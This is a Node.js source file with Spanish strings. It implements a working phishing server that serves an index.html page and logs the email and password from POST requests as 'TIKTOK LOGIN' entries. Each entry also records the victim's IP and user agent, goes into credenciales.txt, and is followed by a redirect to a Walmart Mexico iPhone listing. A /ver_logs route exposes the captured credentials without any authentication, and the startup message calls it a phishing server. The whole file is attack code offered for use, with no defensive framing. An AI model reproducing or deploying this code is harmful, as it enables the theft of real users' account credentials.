const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;

const server = http.createServer((req, res) => {
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            const params = new URLSearchParams(body);
            const email = params.get('email') || 'vacío';
            const pass = params.get('pass') || 'vacío';
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
            const ua = req.headers['user-agent'] || 'desconocido';
            const fecha = new Date().toISOString();
            const log = `TIKTOK LOGIN: Email=${email} | Pass=${pass} | IP=${ip} | UA=${ua} | Fecha=${fecha}\n`;
            fs.appendFile('credenciales.txt', log, (err) => {
                if (err) console.error(err);
            });
            console.log(log);
            res.writeHead(302, { Location: 'https://www.walmart.com.mx/ip/iphone-13-pro-apple-256gb-plata-reacondicionado/00085369895462?athbdg=L1500&from=/search' });
            res.end();
        });
        return;
    }

    if (req.url === '/ver_logs') {
        fs.readFile('credenciales.txt', (err, data) => {
            if (err) {
                res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
                res.end('Aún no hay credenciales capturadas');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
            res.end(data);
        });
        return;
    }

    fs.readFile(path.join(__dirname, 'index.html'), (err, data) => {
        if (err) {
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end('Error');
            return;
        }
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(data);
    });
});

server.listen(PORT, () => {
    console.log(`Servidor phishing corriendo en puerto ${PORT}`);
});
